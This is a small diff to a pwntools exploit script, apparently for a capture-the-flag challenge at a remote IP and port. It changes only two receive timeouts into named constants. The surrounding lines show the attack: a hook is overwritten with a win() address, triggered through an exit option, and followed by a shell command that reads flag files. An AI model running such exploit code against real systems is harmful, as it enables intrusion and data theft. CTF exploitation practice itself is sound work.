@@ -34,6 +34,8 @@ HOST = '212.2.250.33'
 PORT = 30170
 
 context.log_level = 'info'
+INITIAL_RECV_TIMEOUT = 1.5
+FALLBACK_RECV_TIMEOUT = 2.0
 
 # ── connection ───────────────────────────────────────────────────────────────
 r = remote(HOST, PORT)
@@ -139,7 +141,7 @@ log.success(f'win() ({hex(win)}) written to hook @ {hex(hook)}')
 # Step 8: trigger hook via exit (option 5)
 log.info('triggering hook via exit…')
 r.sendline(b'5')
-out = r.recvrepeat(1.5)
+out = r.recvrepeat(INITIAL_RECV_TIMEOUT)
 
 if not out:
     try:
@@ -149,7 +151,7 @@ if not out:
             b'cat flag 2>/dev/null || cat flag.txt 2>/dev/null'
         )
         r.sendline(cmd)
-        out = r.recvrepeat(2.0)
+        out = r.recvrepeat(FALLBACK_RECV_TIMEOUT)
     except EOFError:
         pass
 
